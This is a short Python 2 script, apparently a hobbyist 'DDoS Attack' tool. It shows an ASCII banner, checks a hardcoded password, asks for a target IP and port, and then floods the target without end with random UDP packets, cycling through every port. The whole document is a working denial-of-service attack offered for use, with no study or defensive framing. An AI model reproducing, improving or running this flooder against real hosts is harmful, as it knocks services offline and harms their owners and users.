import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1464)
#############
os.system("clear")
print " ____  _____                     _   _   _             _ "
print "|  _ \|  _  \  ___  ___         / \ | |_| |_ __ _  ___| | __ "
print "| | | | | |  |/ _ \/ __|       / _ \| __| __/ _` |/ __| |/ /"
print "| |_| | |_|  | (_) \__ \      / ___ \ |_| || (_| | (__|   <"
print "|____/|_____/ \___/|___/     /_/   \_\__|\__\__,_|\___|_|\_\ "
print "Please input the Password"
password = input("Password : ")
if password != 1145141919810:
    print"Password error"
    os.exit()

print
ip = raw_input("IP : ")
port = input("port : ")

os.system("clear")
os.system("")
print"The DDoS is Starting!"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     if port == 65535:
       port = 1


       print" Send %s to %s  of Through port 1-65535 "%(sent,ip)

#fixed a bug to if port == 65535
